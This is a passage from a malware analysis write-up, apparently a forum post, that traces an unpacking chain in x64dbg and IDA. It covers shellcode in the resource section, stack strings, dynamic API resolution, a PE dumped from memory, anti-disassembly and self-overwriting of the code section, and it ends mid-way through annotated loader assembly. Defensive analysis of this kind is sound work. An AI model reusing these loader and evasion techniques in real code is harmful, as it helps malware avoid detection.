<p>and since I’ve already analyzed this malware a bit - I’m going to assume these are <a href="https://www.fireeye.com/blog/threat-research/2016/06/automatically-extracting-obfuscated-strings.html" rel="noopener nofollow ugc">encrypted stack strings</a> but we’ll see if this is true later on. Next up we got mambo jumbo code that is built to look confusing but legitimate. But wait! oh boy what’s this at location <strong>loc_4017F9</strong>:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/d/d2cbd82660f60643c1fc5739c08691fe17c72420.png" data-download-href="/uploads/short-url/u4N0cz8854XfHyh3Tu2V4GCtWes.png?dl=1" title=""><img src="/uploads/default/original/2X/d/d2cbd82660f60643c1fc5739c08691fe17c72420.png" alt="" data-base62-sha1="u4N0cz8854XfHyh3Tu2V4GCtWes" width="309" height="342" role="presentation"></a></div><p></p>
<p>A call to a dynamically calculated value and what appears to be an attempt to set a value in the Process Environment Block? What is at <strong>0x2c</strong> being accessed from the <strong>FS</strong> register?</p>
<p><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/4/400b6ae9d4fb7abc035a92e1c8bb400ade093f71_2_602x24.png" alt="" data-base62-sha1="98z1fUJgLbc1HAJH5Bs7ZeueAuJ" width="602" height="24" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/4/400b6ae9d4fb7abc035a92e1c8bb400ade093f71_2_602x24.png, /uploads/default/original/2X/4/400b6ae9d4fb7abc035a92e1c8bb400ade093f71.png 1.5x, /uploads/default/original/2X/4/400b6ae9d4fb7abc035a92e1c8bb400ade093f71.png 2x"></p>
<p>Huh.. It’s attempting to access a value in the Thread Local Storage array(TLS), we’ll check that out too since we don’t know exactly what value it’s attempting to access since <strong>EDX</strong> is dynamically calculated.</p>
<p>After this the code block calls <strong>printf</strong> and terminates, I’m not sure this invocation actually does something.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/1/12f89afdd2268b01bdb6888cf08682c877c4bdc5.png" data-download-href="/uploads/short-url/2HPecSz8hA5LhQ8z2DtrjGdqEpn.png?dl=1" title=""><img src="/uploads/default/original/2X/1/12f89afdd2268b01bdb6888cf08682c877c4bdc5.png" alt="" data-base62-sha1="2HPecSz8hA5LhQ8z2DtrjGdqEpn" width="346" height="286" role="presentation"></a></div><p></p>
<p><strong>So let’s summarize what we gathered so far:</strong></p>
<ol>
<li>A shady looking resource</li>
<li>A lot of local variables being set up that look like encrypted stack strings</li>
<li>A call to a dynamically calculated pointer</li>
<li>Dynamic access to the TLS array</li>
</ol>
<p>Let’s start x64dbg and put a breakpoint on the assumed stack strings, and <strong>loc_4017F9</strong>. In addition just for safety let’s place a breakpoint on <strong>VirtualAlloc</strong> and <strong>CreateProcessW</strong>.</p>
<p>We break on the assumed stack strings at location <strong>0x4011DE</strong>, now I’m going to access the dump pointed by these variables after I run the entire variable assignment block at <strong>loc_4011C5</strong>:</p>
<p><img src="/uploads/default/original/2X/a/a65cb423a92ec2188cf59347167012fb4a44f5bc.png" alt="" data-base62-sha1="nJHSmnwK32nkjlbk43x5WwrpWwI" width="592" height="59" role="presentation"></p>
<p><img src="/uploads/default/original/2X/9/9e3eabb3711a4396bf9a25bdd8fcb41eef146385.png" alt="" data-base62-sha1="mzTI7MhOxOYV8c7GcVOgjd4X3wN" width="357" height="22" role="presentation"></p>
<p><img src="/uploads/default/original/2X/9/9af9e8c73de7396f4257b455c5a2c940d89482af.png" alt="" data-base62-sha1="m6YXqZkje8B4WBrKJf1X3dIjS0f" width="405" height="23" role="presentation"></p>
<p>This is data, but I’m not sure all of it is data, we’ll see how this plays out later.</p>
<p>Next we hit on <strong>CreateProcessW</strong> which attempts to create <strong>splwow64.exe</strong> which is the printer driver we saw the malware launching before with command like parameters:</p>
<p>C:\Windows\splwow64.exe 8192</p>
<p>But it seems to be created because of a call to the API <strong>DeviceCapabilitiesA</strong> which is not much of interest to us.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/6/6f6bd156ee054ee4497918431c716284eb60c3e0.png" data-download-href="/uploads/short-url/fTFZQXa7G0rn04l3Flkl3OEuWe4.png?dl=1" title=""><img src="/uploads/default/original/2X/6/6f6bd156ee054ee4497918431c716284eb60c3e0.png" alt="" data-base62-sha1="fTFZQXa7G0rn04l3Flkl3OEuWe4" width="602" height="149" role="presentation"></a></div><p></p>
<hr>
<h2><a name="p-53180-trick-number-0-embedding-shellcode-in-the-resource-section-7" class="anchor" href="https://d.clarkee.co.uk#p-53180-trick-number-0-embedding-shellcode-in-the-resource-section-7"></a>Trick number 0 - Embedding shellcode in the resource section</h2>
<p>Next we hit <strong>VirtualAlloc</strong> and upon exit it seems to be moving the allocated returned memory to 0x4260AC! that’s the address of the value that is going to be called later:</p>
<p><img src="/uploads/default/original/2X/1/1cf10891f6090ffe31c2dba154f5af8c110102a0.png" alt="" data-base62-sha1="481MqdVFwbwZtrGa5zL7LLeAjWE" width="253" height="25" role="presentation"></p>
<p>Let’s set a hardware on access breakpoint on the returned from <strong>VirtualAlloc</strong> value:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/0/02dbb55e299052975f4a1582e9bc08df43f83f8a.png" data-download-href="/uploads/short-url/phG2RaFkdVQ6Kkld71g57zZB5o.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/02dbb55e299052975f4a1582e9bc08df43f83f8a_2_602x323.png" alt="" data-base62-sha1="phG2RaFkdVQ6Kkld71g57zZB5o" width="602" height="323" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/02dbb55e299052975f4a1582e9bc08df43f83f8a_2_602x323.png, /uploads/default/original/2X/0/02dbb55e299052975f4a1582e9bc08df43f83f8a.png 1.5x, /uploads/default/original/2X/0/02dbb55e299052975f4a1582e9bc08df43f83f8a.png 2x"></a></div><p></p>
<p>It gets accessed a few times and after 2 times of hitting run I land at <strong>loc_4017F9</strong>:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/4/4e9bbdbe3f5cdbb3e89429531903b36601fdf8fe.png" data-download-href="/uploads/short-url/bdoUPzL5KeKxDDbA3mgAiDEx8bs.png?dl=1" title=""><img src="/uploads/default/original/2X/4/4e9bbdbe3f5cdbb3e89429531903b36601fdf8fe.png" alt="" data-base62-sha1="bdoUPzL5KeKxDDbA3mgAiDEx8bs" width="602" height="215" role="presentation"></a></div><p></p>
<p>I decided to look on the dump of the allocated area returned from <strong>VirtualAlloc</strong> and it reminded me of something I’ve seen before:<br>
<img src="/uploads/default/original/2X/b/bce6158a02a605b95b7887c5b8343331b7881c49.png" alt="" data-base62-sha1="qX4ItOMBt7YBReA3ulY11IoCz0J" width="594" height="16" role="presentation"></p>
<p>Wait, let’s check the resource section of this sample that we looked at before:<br>
<img src="/uploads/default/original/2X/7/7d0ffdd5ebb0ce0e26658beb6dc7ff9777dc2e1b.png" alt="" data-base62-sha1="hQlWCDgLezS6fy0DqjRwGjx6LTd" width="522" height="18" role="presentation"></p>
<p>They match! hmm:<br>
<img src="/uploads/default/original/2X/8/8ae3c774c50bb714fb1bd93237bc7cc44b37c788.png" alt="" data-base62-sha1="jOFU8xxdT6ZbHMxQjlU1rDYOzH2" width="244" height="93" role="presentation"></p>
<p>Before the call to that dynamic variable at <strong>dword_4260B4</strong> we see that another DWORD is being used located at <strong>dword_4260B4</strong>(passed to <strong>EAX</strong>). if we look at <strong>dword_4260AC</strong> in disassembler view it doesn’t look like valid code:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/7/7ab856fa75bc79732f06a7f9d131dba1607f2c0e.png" data-download-href="/uploads/short-url/hvDcfdy9A2wDEm0siZCRw2SQnMi.png?dl=1" title=""><img src="/uploads/default/original/2X/7/7ab856fa75bc79732f06a7f9d131dba1607f2c0e.png" alt="" data-base62-sha1="hvDcfdy9A2wDEm0siZCRw2SQnMi" width="602" height="264" role="presentation"></a></div><p></p>
<p>So this little invocation at <strong>0x40180E</strong> to <strong>sub_401110</strong> gives me a hutch that it might lead to a decryption of that entire resource.</p>
<p><strong>dword_4260B4</strong> holds value of <strong>0x8BB9</strong> and if we view the resource length that was mapped into <strong>dword_4260AC</strong> we can clearly see they have the same size!</p>
<p><img src="/uploads/default/original/2X/d/dc4b570247d71f3db5812197fe7d445d3591646e.png" alt="" data-base62-sha1="vqOsqg4K9tRKFVO10Ft9wZexePA" width="242" height="25" role="presentation"></p>
<p>I decided to rename the variables and jump pass the call <strong>sub_401110</strong>(func_ResourceDecryptionRoutine) :</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/0/077bf4c7f651c9524d66d67ac2d4f828276a124a.png" data-download-href="/uploads/short-url/14cURCFGg5tlH360qVLMUVBgh5w.png?dl=1" title=""><img src="/uploads/default/original/2X/0/077bf4c7f651c9524d66d67ac2d4f828276a124a.png" alt="" data-base62-sha1="14cURCFGg5tlH360qVLMUVBgh5w" width="354" height="265" role="presentation"></a></div><p></p>
<p>To see what will happen to the resource section that was mapped into memory I decided to place hardware breakpoints on <strong>dword_4260AC</strong> to check for memory access, after my hardware breakpoints got triggered the allocated resource view in disassembly turned into this:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/d/d1eb60dbb181cc4926b224be482676c9c5cf37f6.png" data-download-href="/uploads/short-url/tX25oSBsujGXF2mongvlbT2nuzY.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d1eb60dbb181cc4926b224be482676c9c5cf37f6_2_602x196.png" alt="" data-base62-sha1="tX25oSBsujGXF2mongvlbT2nuzY" width="602" height="196" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d1eb60dbb181cc4926b224be482676c9c5cf37f6_2_602x196.png, https://0x00sec.s3.amazonaws.com/optimized/2X/d/d1eb60dbb181cc4926b224be482676c9c5cf37f6_2_903x294.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/d/d1eb60dbb181cc4926b224be482676c9c5cf37f6_2_1204x392.png 2x"></a></div><p></p>
<p>Awesome!</p>
<p>So let’s enter the rabbit hole and see where it leads us, but before we do that - let’s dump this into memory to see what’s going exactly:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/0/0bb5bcfcd5ad4ee2238b848a7f8f665cb195bc0d.png" data-download-href="/uploads/short-url/1FACIK9dxLTGSR1DT76mgZrKAMZ.png?dl=1" title=""><img src="/uploads/default/original/2X/0/0bb5bcfcd5ad4ee2238b848a7f8f665cb195bc0d.png" alt="" data-base62-sha1="1FACIK9dxLTGSR1DT76mgZrKAMZ" width="602" height="241" role="presentation"></a></div><p></p>
<p>IDA view of dumped shellcode:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/3/30dd2972e188d24f0cadb0ef0efc74fc56bea8c9.png" data-download-href="/uploads/short-url/6YgKRf85phjkqHHW3XaK2o46i81.png?dl=1" title=""><img src="/uploads/default/original/2X/3/30dd2972e188d24f0cadb0ef0efc74fc56bea8c9.png" alt="" data-base62-sha1="6YgKRf85phjkqHHW3XaK2o46i81" width="602" height="316" role="presentation"></a></div><p></p>
<p>I’ve analyzed the dump a bit, and found that the function called at offset <strong>0x33</strong> is where the main execution happens but unfortunately it looks like this:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/1/1f26a928ae9905671e7ffab64165f3dcba1a47d1.png" data-download-href="/uploads/short-url/4rzDb5qLKaoX7GD5NfTWG6POcGl.png?dl=1" title=""><img src="/uploads/default/original/2X/1/1f26a928ae9905671e7ffab64165f3dcba1a47d1.png" alt="" data-base62-sha1="4rzDb5qLKaoX7GD5NfTWG6POcGl" width="125" height="422" role="presentation"></a></div><p></p>
<p>Let’s scroll around the IDB to see if we can find some interesting anomalies:</p>
<p>Our first encounter is at code block <strong>loc_4C:</strong></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/e/e655b02175933a629245e759246839bea078f528.png" data-download-href="/uploads/short-url/wRDp2FfIjw9Lwv6cbmvpxkHADUI.png?dl=1" title=""><img src="/uploads/default/original/2X/e/e655b02175933a629245e759246839bea078f528.png" alt="" data-base62-sha1="wRDp2FfIjw9Lwv6cbmvpxkHADUI" width="285" height="425" role="presentation"></a></div><p></p>
<hr>
<h2><a name="p-53180-trick-number-1-stack-strings-8" class="anchor" href="https://d.clarkee.co.uk#p-53180-trick-number-1-stack-strings-8"></a>Trick number 1 - Stack Strings</h2>
<p>This again looks like stack strings, and they all contain a call right after the push. If we’ll attempt to parse these strings manually and turn them into ASCII strings we can find something really interesting:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/e/e58cdd55f0115b52b686b7731e94cc980ca3e97e.png" data-download-href="/uploads/short-url/wKH8MOlorpBLmjqb6ctXR04qsbQ.png?dl=1" title=""><img src="/uploads/default/original/2X/e/e58cdd55f0115b52b686b7731e94cc980ca3e97e.png" alt="" data-base62-sha1="wKH8MOlorpBLmjqb6ctXR04qsbQ" width="210" height="340" role="presentation"></a></div><p></p>
<p>First it appears to load <strong>kernel32.dll</strong> and <strong>call [ebp-28h]</strong>, Then we see a push to <strong>VirtualAlloc</strong> and a call to <strong>[ebp-60h]</strong>. Each time a new function string is pushed, <strong>[ebp-60h]</strong> is called. I have reason to suspect that <strong>[ebp-28h]</strong> is  the address of <strong>LoadLibraryA</strong> and <strong>[ebp-60h]</strong> is the address of <strong>GetProcAddress</strong>, we’ll map this assumption into IDA:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/1/1805c93ce462b29fffa458172a92292a6fd4e0fe.png" data-download-href="/uploads/short-url/3qvR4a4soMAaMfCFy3uwm2qy7NQ.unknown?dl=1" title=""><img src="/uploads/default/original/2X/1/1805c93ce462b29fffa458172a92292a6fd4e0fe.png" alt="" data-base62-sha1="3qvR4a4soMAaMfCFy3uwm2qy7NQ" width="164" height="500" role="presentation"></a></div><p></p>
<p>This mapping actually aids us to recover more artifacts from just looking at the the dumped memory statically:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/1/1c470decbca9ddc0e24c18b511f5974c14d9875b.png" data-download-href="/uploads/short-url/429Bm2H2KqbYP8lKwWoze0KPI9R.png?dl=1" title=""><img src="/uploads/default/original/2X/1/1c470decbca9ddc0e24c18b511f5974c14d9875b.png" alt="" data-base62-sha1="429Bm2H2KqbYP8lKwWoze0KPI9R" width="174" height="323" role="presentation"></a></div><p></p>
<p>Let’s debug this memory dump and see if we’re correct:</p>
<p><img src="/uploads/default/original/2X/3/3d9d0b876de231710c8d57eb81a8bc0d925def94.png" alt="" data-base62-sha1="8N3AM0lzUnlDgCYg13bjaOdJA3y" width="602" height="31" role="presentation"></p>
<p><img src="/uploads/default/original/2X/e/e72c864d3ec527f79299315e8dc6fc0a2f4082f5.png" alt="" data-base62-sha1="wZ3GJnmeKQXAjplJkaCoQnwvM0d" width="560" height="25" role="presentation"><br>
<img src="/uploads/default/original/2X/0/0a1029876fe146b9c37fd52334826744f3c78026.png" alt="" data-base62-sha1="1r1oVHpWKVnzGp9XPQceko7Vbq6" width="602" height="31" role="presentation"><br>
<img src="/uploads/default/original/2X/9/908af432e44ac4c5b553396f49ab1cdaed2e1d10.png" alt="" data-base62-sha1="kCGsIb3EYmSsGOEZnuYTw7EgO2I" width="598" height="13" role="presentation"><br>
Our assumptions are indeed correct!</p>
<hr>
<h2><a name="p-53180-trick-number-2-handling-dynamic-api-calls-in-ida-9" class="anchor" href="https://d.clarkee.co.uk#p-53180-trick-number-2-handling-dynamic-api-calls-in-ida-9"></a>Trick Number 2 - Handling Dynamic API calls in IDA:</h2>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/5/5fccff5ec78dc79cb2fdfefc598f47a4232a59dd.png" data-download-href="/uploads/short-url/dFuz1sDOltv7qOJcSOCoeZc0vEh.png?dl=1" title=""><img src="/uploads/default/original/2X/5/5fccff5ec78dc79cb2fdfefc598f47a4232a59dd.png" alt="" data-base62-sha1="dFuz1sDOltv7qOJcSOCoeZc0vEh" width="267" height="158" role="presentation"></a></div><p></p>
<p>So we have this issue, The base address of <strong>TerminateProcess</strong> is going to placed in <strong>[ebp-0ACH]</strong> as we can see on the last line(I’m assuming you guys know that in the <strong>stdcall</strong> convention, the return value is returned in <strong>EAX</strong> and that you know what <strong>GetProcAddress</strong> does). We can’t go and manually map each and one of these by clicking K on each local variable like some potato, we must edit the function so that IDA will know that any time the <strong>EBP</strong> register is being access using offsets its actually accessing local variables so let’s tell IDA it’s an <strong>EBP</strong> based function:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/c/c609528e77e4bc4500839cd8c5e2d303ca828276.png" data-download-href="/uploads/short-url/sfUvLZgf74hWakvDPfCv5wT7ftY.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c609528e77e4bc4500839cd8c5e2d303ca828276_2_217x303.png" alt="" data-base62-sha1="sfUvLZgf74hWakvDPfCv5wT7ftY" width="217" height="303" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c609528e77e4bc4500839cd8c5e2d303ca828276_2_217x303.png, https://0x00sec.s3.amazonaws.com/optimized/2X/c/c609528e77e4bc4500839cd8c5e2d303ca828276_2_325x454.png 1.5x, /uploads/default/original/2X/c/c609528e77e4bc4500839cd8c5e2d303ca828276.png 2x"></a></div><p></p>
<p>Let’s click edit function and mark the function as <strong>EBP</strong> based:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/0/062473b384e8ca402e17b87d71c63739928b801f.png" data-download-href="/uploads/short-url/SkXGW1Wh5KzZSLQ6jvEwsXOTj9.png?dl=1" title=""><img src="/uploads/default/original/2X/0/062473b384e8ca402e17b87d71c63739928b801f.png" alt="" data-base62-sha1="SkXGW1Wh5KzZSLQ6jvEwsXOTj9" width="338" height="242" role="presentation"></a></div><p></p>
<p>Now we can rename all the local variables and see the changes get applied all across the IDB! So let’s fix the dynamic API resolving local variables and keep searching for anomalies. I didn’t find anything worthwhile so I decided to place a breakpoint on <strong>VirtualAlloc</strong> and see what happens and indeed we broke on offset <strong>0x1B8</strong>:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/7/720552a43b53a7f5eb4f42a5f63b1581ae497c80.png" data-download-href="/uploads/short-url/ggFPOuNVy46KvFtSCUnoSqERIbe.png?dl=1" title=""><img src="/uploads/default/original/2X/7/720552a43b53a7f5eb4f42a5f63b1581ae497c80.png" alt="" data-base62-sha1="ggFPOuNVy46KvFtSCUnoSqERIbe" width="379" height="221" role="presentation"></a></div><p></p>
<p>I’ve access the dump of the newly allocated memory which is passed into <strong>var_10</strong>.</p>
<p>Let’s set up a hardware breakpoint on the first DWORD of the allocated memory and see if it gets accessed:</p>
<p><img src="/uploads/default/original/2X/f/f41a58c2c4f2bf1179ab06d7ec4c11def40d46d7.png" alt="" data-base62-sha1="yPqWVgoZBtdJSh5GdE4Rgk6IPt5" width="589" height="14" role="presentation"></p>
<hr>
<h2><a name="p-53180-trick-number-3-dumping-pe-files-from-memory-10" class="anchor" href="https://d.clarkee.co.uk#p-53180-trick-number-3-dumping-pe-files-from-memory-10"></a>Trick number 3 - Dumping PE files from memory:</h2>
<p>It does, and with a promising <strong>MZ</strong> signature that might indicate that a new file is being mapped, now we have to be careful here because I only set a breakpoint on the first <strong>DWORD</strong> of <strong>0x1EB0000</strong> - if we execute another time we will lose control over the malware, When I did that by accident the malware began to start an infinite amount of threads to circumvent our analysis and crash the vm!</p>
<p>We are currently executing at offset <strong>0x9B2</strong> inside <strong>sub_978</strong> and if we look in IDA at how complicated this function is we’ll have to collect our jaw from the floor:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/c/c3c16559bde805e0354a6e61e7280808a4b01f31.png" data-download-href="/uploads/short-url/rVJsf6O0f5tto07XaqguRrkFtVn.png?dl=1" title=""><img src="/uploads/default/original/2X/c/c3c16559bde805e0354a6e61e7280808a4b01f31.png" alt="" data-base62-sha1="rVJsf6O0f5tto07XaqguRrkFtVn" width="349" height="448" role="presentation"></a></div><p></p>
<p>Let’s assume the <strong>MZ</strong> signature is no coincidence and a PE file is being mapped into memory, maybe if we find where this loop end and break there, we might successfully map the file entirely and then we can dump it!</p>
<p><strong>sub_978</strong> ends at <strong>loc_BBA</strong>:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/d/d3c8f1583914a8e9ef620fde02bcb92892169baa.png" data-download-href="/uploads/short-url/udxgniGSNLNsR0GFbLbhOhTJqT8.png?dl=1" title=""><img src="/uploads/default/original/2X/d/d3c8f1583914a8e9ef620fde02bcb92892169baa.png" alt="" data-base62-sha1="udxgniGSNLNsR0GFbLbhOhTJqT8" width="181" height="354" role="presentation"></a></div><p></p>
<p>so let’s set up a breakpoint there and see what happens:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/c/c26a13cbef0b6c4f699ec008e853bf5dbe393dd5.png" data-download-href="/uploads/short-url/rJRTJmWTBJqqJHIVZIYEmJc0A2F.png?dl=1" title=""><img src="/uploads/default/original/2X/c/c26a13cbef0b6c4f699ec008e853bf5dbe393dd5.png" alt="" data-base62-sha1="rJRTJmWTBJqqJHIVZIYEmJc0A2F" width="592" height="169" role="presentation"></a></div><p></p>
<p>We were correct!</p>
<p>Before we continue execution let’s dump this PE using Scylla and see how IDA will parse it:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/e/e40826c10505487b95d60847d3fce2be0c56ab06.png" data-download-href="/uploads/short-url/wxgkiZ2hSUkJOdQdKlbbmswwVj8.png?dl=1" title=""><img src="/uploads/default/original/2X/e/e40826c10505487b95d60847d3fce2be0c56ab06.png" alt="" data-base62-sha1="wxgkiZ2hSUkJOdQdKlbbmswwVj8" width="602" height="317" role="presentation"></a></div><p></p>
<p>I have seen this before, but only in books. This anti disassembly at its finest. It attempts to trick IDA’s disassembler by creating these faulty jump instructions that will just into the middle of other parsed instructions - IDA doesn’t know how to deal with this so it will begin parsing instructions incorrectly. We will deal with this later as we are not done with the first binary.</p>
<hr>
<h2><a name="p-53180-trick-number-4-self-loading-heavy-waves-of-nostalgia-intensifieshttpsdanusminimusgithubioanalyzing-modern-malware-techniques-part-1-11" class="anchor" href="https://d.clarkee.co.uk#p-53180-trick-number-4-self-loading-heavy-waves-of-nostalgia-intensifieshttpsdanusminimusgithubioanalyzing-modern-malware-techniques-part-1-11"></a>Trick number 4 - Self Loading, <a href="https://danusminimus.github.io/Analyzing-Modern-Malware-Techniques-Part-1/" rel="noopener nofollow ugc">[heavy waves of nostalgia intensifies]</a></h2>
<p>Let’s go back to x64dbg, after we leave the mapping function we are supposed to land at offset <strong>0x1E0</strong>. Our next anomaly will be met at location <strong>0x1F8</strong> where a <strong>VirtualProtect</strong> call is being made:</p>
<p><img src="/uploads/default/original/2X/1/18c23c41872bf7c37faeb4fad119e6504831b597.png" alt="" data-base62-sha1="3x1BC0AxLoiCupEk7l5nQusF6dx" width="602" height="12" role="presentation"></p>
<p><img src="/uploads/default/original/2X/3/3335ae4a14f2af1929e63d35333175822a6e51b3.png" alt="" data-base62-sha1="7j1mq2WbxcAApU29YtkqzQ4dku7" width="294" height="55" role="presentation"></p>
<p>On the base address of the main image? what?</p>
<p><img src="/uploads/default/original/2X/e/ed55c02f4e43539ddfaae6bf1a7276ae7a5960d1.png" alt="" data-base62-sha1="xRySAUDyFByadw8JI68VxumaB8Z" width="602" height="11" role="presentation"></p>
<p>If we execute the call, the <strong>.text</strong> section which is responsible for storing the code of the PE file has its memory protection changed. It can now be Read from, Executed and WRITTEN TO, that is not supposed to happen! let’s see what happens next:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/2/2426c34ca352804fbb045d9d98716ebca631a904.png" data-download-href="/uploads/short-url/59OeL1Q0ZVij3sjRI9V9tvnKUhC.png?dl=1" title=""><img src="/uploads/default/original/2X/2/2426c34ca352804fbb045d9d98716ebca631a904.png" alt="" data-base62-sha1="59OeL1Q0ZVij3sjRI9V9tvnKUhC" width="269" height="483" role="presentation"></a></div><p></p>
<p>We enter a <strong>sub_BDD</strong> and if we view the functions behavior in the debugger, we can see that <a href="http://faydoc.tripod.com/cpu/stosb.htm" rel="noopener nofollow ugc">rep stosb</a> instruction will begin to copy the zeroes stored in <strong>AL</strong> to replace the value of addresses pointed by <strong>EDI</strong>. <strong>EDI</strong> is pointing to the code section of the main sample! It’s rewriting its own code section wow!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/0/07fb4132517bec065810456202168f04534f9b86.png" data-download-href="/uploads/short-url/18BEtWb3uDGYEMtOmLlBhdUCAv4.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/07fb4132517bec065810456202168f04534f9b86_2_602x369.png" alt="" data-base62-sha1="18BEtWb3uDGYEMtOmLlBhdUCAv4" width="602" height="369" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/07fb4132517bec065810456202168f04534f9b86_2_602x369.png, https://0x00sec.s3.amazonaws.com/optimized/2X/0/07fb4132517bec065810456202168f04534f9b86_2_903x553.png 1.5x, /uploads/default/original/2X/0/07fb4132517bec065810456202168f04534f9b86.png 2x"></a></div>It’s gone!<p></p>
<p>I’m going to assume that the malware will copy the newly mapped PE into the code section of the current executing binary. let’s see if our assumption is correct.</p>
<p>When we exit the function <strong>sub_BDD</strong> we land at offset <strong>0x220</strong>:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/1/19eeebf72a2df8a1f89d1e812b0520c0532fb324.png" data-download-href="/uploads/short-url/3HpP6kNi2f2Wt77sTx2ircyvpm4.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/1/19eeebf72a2df8a1f89d1e812b0520c0532fb324_2_602x163.png" alt="" data-base62-sha1="3HpP6kNi2f2Wt77sTx2ircyvpm4" width="602" height="163" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/1/19eeebf72a2df8a1f89d1e812b0520c0532fb324_2_602x163.png, https://0x00sec.s3.amazonaws.com/optimized/2X/1/19eeebf72a2df8a1f89d1e812b0520c0532fb324_2_903x244.png 1.5x, /uploads/default/original/2X/1/19eeebf72a2df8a1f89d1e812b0520c0532fb324.png 2x"></a></div><p></p>
<p>If we keep stepping over instructions we begin to see the string <strong>“.text”</strong>, which gives me a hutch that we’re are traversing through the PE Header format of the current executing binary and come to think of it, if we look at offset <strong>0x22c</strong> we see:</p>
<p><img src="/uploads/default/original/2X/4/47e3135611c91e707fd701fca3e8a496efb49843.png" alt="" data-base62-sha1="afWpgndXgEnOGb3O0MfnIPJk9s7" width="214" height="23" role="presentation"></p>
<p>And I know that <strong>3Ch</strong> is the <strong>e_lfanew</strong> field in the PE File header format, hmm.. Lets trying to map this in IDA and see if this assumption makes any sense:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/e/e85f9b99e6e3a1498e2aea502a1d9aae050a8860.png" data-download-href="/uploads/short-url/x9FBWkfIRpgwNGOZRlS1A6akHZK.png?dl=1" title=""><img src="/uploads/default/original/2X/e/e85f9b99e6e3a1498e2aea502a1d9aae050a8860.png" alt="" data-base62-sha1="x9FBWkfIRpgwNGOZRlS1A6akHZK" width="422" height="373" role="presentation"></a></div><p></p>
<p>It’s actually traversing through the newly mapped PE file!</p>
<p>I mapped it and now will explain how this entire process is done:</p>
<pre><code>mov eax, [ebp+lpvoidVirtualMemory]
mov [ebp+lpVoidNewMappedPE], eax
mov eax, [ebp+lpVoidNewMappedPE]
mov eax, [eax+_IMAGE_DOS_HEADER.e_lfanew] ; Get the value of e_lfanew
mov ecx, [ebp+lpvoidVirtualMemory] ; Get Image base of the newly mapped PE
lea eax, [ecx+eax+4] ; Access IMAGE_NT_HEADERS by adding e_lfawnew to the image base of the newly mapped PE
mov [ebp+_IMAGE_NT_HEADERS], eax ; Save the address of _IMAGE_NT_HEADERS of the newly mapped PE
</code></pre>
<hr>
<pre><code>mov eax, [ebp+_IMAGE_NT_HEADERS]
movzx eax, [eax+IMAGE_FILE_HEADER.SizeOfOptionalHeader] ; Get the size of _IMAGE_OPTIONAL_HEADERS from the newly mapped PE
mov ecx, [ebp+lpVoidNewMappedPE]
mov ecx, [ecx+_IMAGE_DOS_HEADER.e_lfanew]
lea eax, [ecx+eax+18h] ; Skip to the first section of the newly mapped PE
</code></pre>
<hr>
<pre><code>push [eax+_IMAGE_SECTION_HEADER.PointerToRawData] ; Push the address of the first section of the new mapped PE
push [ebp+lpVoidNewMappedPE] ; Push the Image base address of the newly mapped PE
